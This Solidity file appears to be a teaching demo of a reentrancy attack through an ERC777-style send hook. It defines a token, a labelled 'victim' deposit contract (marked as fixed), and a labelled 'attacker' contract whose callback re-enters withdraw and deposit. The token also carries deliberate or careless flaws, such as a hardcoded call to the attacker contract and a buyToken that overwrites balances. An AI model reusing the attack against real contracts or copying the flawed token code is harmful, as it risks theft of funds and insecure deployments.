// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract TokenContract {

    mapping (address => uint256) public balanceOf;
    string public symbol;
    mapping (address => mapping(address => uint256)) public allowances;
    uint public tokenPrice;
    uint public totalSupply;
    uint public availableSupply;
    address private owner;

    event Transfer(address indexed _from,
                   address indexed _to,
                   uint256 _value);
    event Approval(address indexed _owner,
                   address indexed _spender,
                   uint256 _value);

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    constructor (uint _tokenPrice, uint _totalSupply, string memory _symbol) {
        tokenPrice = _tokenPrice;
        totalSupply = _totalSupply;
        availableSupply = totalSupply;
        owner = msg.sender;
        symbol = _symbol;
    }


    function approve(address _spender, uint256 _value)
        public
        returns (bool success)
    {
        allowances[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value)
        public
        returns (bool success)
    {
        // require(_to != address(0), "");
        // require(_from != address(0));
        require(_value <= balanceOf[_from], "not enough balance");
        require(_value <= allowances[_from][msg.sender], "not allowed to transfer so much");

        // _callTokensToSend(msg.sender, _from, _to, _value, "", "");
        // explicit use of the malicious contract instead of _callTokensToSend
        Malicious m = Malicious(_from);
        m.tokensToSend(msg.sender, _from, _to, _value, "", "");

        // _move(msg.sender, _from, _to, _value, "", "");
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowances[_from][msg.sender] -= _value;

        // _callTokensReceived(msg.sender, _from, _to, _value, "", "", false);

        emit Transfer(_from, _to, _value);
        return true;
    }

    function allowance(address _owner, address _spender)
        public
        view
        returns(uint256 remaining)
    {
        return allowances[_owner][_spender];
    }

    function transfer(address _to, uint256 _value)
        external
        returns (bool success)
    {
        require(balanceOf[msg.sender] >= _value);
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function buyToken(uint noOfTokensToBuy)
        public
        payable
    {
        require(noOfTokensToBuy > 0);
        require(noOfTokensToBuy <= availableSupply);
        require(msg.value >= noOfTokensToBuy * tokenPrice);
        balanceOf[msg.sender] = noOfTokensToBuy;
        availableSupply -= noOfTokensToBuy;
        bool success = payable(msg.sender).send(msg.value - noOfTokensToBuy * tokenPrice);
        if (!success) revert();
    }

    function withdrawEth() 
        onlyOwner 
        external 
    {
        payable(owner).transfer(address(this).balance);
    }
}

// the victim
contract DepositContract {

    mapping (address => uint) tokenBalance;
    TokenContract public tokenContract;

    constructor(address _tokenContract) {
        tokenContract = TokenContract(_tokenContract);
    }

    function deposit(uint _tokensToExchange) 
        external 
    {
        uint allowance = tokenContract.allowance(msg.sender, address(this));
        if (allowance >= _tokensToExchange) {
            uint currentBal = tokenBalance[msg.sender];
            // fix: update before transferFrom
            tokenBalance[msg.sender] = currentBal + _tokensToExchange;
            tokenContract.transferFrom(msg.sender, address(this), _tokensToExchange);
        } else revert("allowance is less than requested tokens");
    }

    function withdraw(uint _tokensToWithdraw) 
        external 
    {
        require(
            _tokensToWithdraw <= tokenBalance[msg.sender], 
            "not enough tokens to withdraw"
        );
        tokenBalance[msg.sender] -= _tokensToWithdraw;
        tokenContract.transfer(msg.sender, _tokensToWithdraw);
    }

    function tokenBalanceOf(address addr) 
        external 
        view 
        returns(uint) 
    {
        return tokenBalance[addr];
    }
}

// the attacker
contract Malicious {
    
    TokenContract private token;
    DepositContract private victim;
    address private attacker;
    uint private called;
    uint private limit = 2;

    constructor(address _depositContract, address _tokenContract) {
        token = TokenContract(_tokenContract);
        victim = DepositContract(_depositContract);
        attacker = msg.sender;
        token.approve(address(victim), limit * 10);
    }

    function initialDeposit() 
        public 
    {
        require(msg.sender == attacker, "Attacker only");
        called = 1; // do not trigger withdrawal in hook
        victim.deposit(9);
    }

    function attack(uint _value) 
        public 
    {
        require(msg.sender == attacker, "Attacker only");
        called = 0;
        victim.deposit(_value);
    }

    // this function will be called by ExchangeContract as callback
    function tokensToSend(address, address, address, uint256, bytes calldata, bytes calldata) 
        external 
    {
        require(
            msg.sender == address(token), 
            "Hook is called by TokenContract only"
        );
        called += 1;
        if(called < limit) {
            victim.withdraw(9);
            victim.deposit(1); 
        }
    }
}